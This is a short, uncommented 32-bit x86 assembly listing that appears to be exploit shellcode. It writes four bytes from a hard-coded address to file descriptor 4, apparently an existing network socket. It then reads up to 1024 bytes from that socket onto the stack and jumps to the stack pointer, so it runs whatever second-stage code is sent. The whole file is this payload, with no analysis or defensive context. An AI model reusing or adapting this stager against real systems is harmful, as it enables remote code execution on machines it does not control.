BITS 32

[SECTION .text]

global _start

_start:
push byte 0x40
pop ebx
shl ebx, 6
sub esp, ebx

push byte 4
pop eax
mov ebx, eax
mov ecx, 0x804c060
mov edx, eax
int 0x80

push byte 3
pop eax
push byte 4
pop ebx
mov ecx, esp
push byte 0x40
pop edx
shl edx, 4
int 0x80
jmp esp

